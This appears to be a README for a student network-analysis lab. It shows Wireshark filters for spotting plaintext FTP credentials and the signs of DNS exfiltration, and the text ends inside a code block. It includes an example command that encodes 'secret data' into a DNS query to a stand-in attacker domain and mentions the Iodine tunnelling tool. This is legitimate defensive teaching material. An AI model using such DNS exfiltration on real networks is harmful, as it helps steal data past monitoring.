# 🔍 Network Traffic Analysis with Wireshark & tcpdump

## 📘 Overview
This project demonstrates how to use Wireshark and tcpdump on Kali Linux to capture and analyze different types of network traffic. It focuses on identifying insecure protocols and suspicious behaviors such as plaintext credentials and data exfiltration through DNS.

The goal is to showcase practical network analysis skills relevant to cybersecurity roles such as SOC Analyst and Security Analyst.

---

## 🛠️ Tools Used
- Kali Linux (2024.1)
- Wireshark
- tcpdump
- FTP server (vsftpd or Metasploitable)
- Dig / Iodine for DNS testing

---

## 🧪 Traffic Analysis

### 1️⃣ FTP Login in Plaintext

- **Capture File:** `ftp_login.pcap`
- **Scenario:** A user logs into an FTP server using unencrypted credentials.
- **Findings:** The credentials were clearly visible in the packet capture.
  
#### 🔎 Key Observations:
- FTP transmits credentials in plaintext.
- Wireshark filter used: `ftp.request`
- Captured `USER` and `PASS` commands with values.

📷 **Screenshot:**  
![FTP Login](screenshots/ftp_login.png)

---

### 2️⃣ DNS Exfiltration Attempt

- **Capture File:** `dns_exfiltration.pcap`
- **Scenario:** A client encodes sensitive data into DNS queries.
- **Findings:** Suspiciously long or randomized domain names that indicate potential exfiltration.

#### 🔎 Key Observations:
- Used `dig` to simulate exfiltration:
  ```bash
  dig verysecretdata.attacker-domain.com

